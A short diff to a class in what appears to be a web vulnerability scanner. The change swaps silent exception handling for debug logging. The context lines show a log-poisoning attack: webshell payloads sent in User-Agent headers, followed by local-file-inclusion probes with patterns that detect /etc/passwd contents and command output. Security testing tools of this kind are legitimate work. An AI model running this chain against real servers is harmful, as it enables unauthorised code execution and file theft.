@@ -367,8 +367,8 @@ class LogPoisoningChain:
         for webshell in _LOG_POISON_PAYLOADS_ADV:
             try:
                 session.get(url, headers={"User-Agent": webshell}, timeout=timeout, allow_redirects=False)
-            except Exception:
-                pass
+            except Exception as _fix_e:
+                logger.debug(f"[scanners.crlf_injection] {type(_fix_e).__name__}: {_fix_e!r}")
             lfi = self._try_lfi_confirm(url, session, uid, timeout)
             if lfi:
                 return {
@@ -395,8 +395,8 @@ class LogPoisoningChain:
                     body = getattr(resp, "text", "")[:2000]
                     if re.search(r"<\?php|uid=\d+|root:.*:0:0:|Apache|nginx", body):
                         return {"lfi_url": lfi_url, "log_path": log_path, "body_snippet": body[:300]}
-                except Exception:
-                    pass
+                except Exception as _fix_e:
+                    logger.debug(f"[scanners.crlf_injection] {type(_fix_e).__name__}: {_fix_e!r}")
         return None
 
 
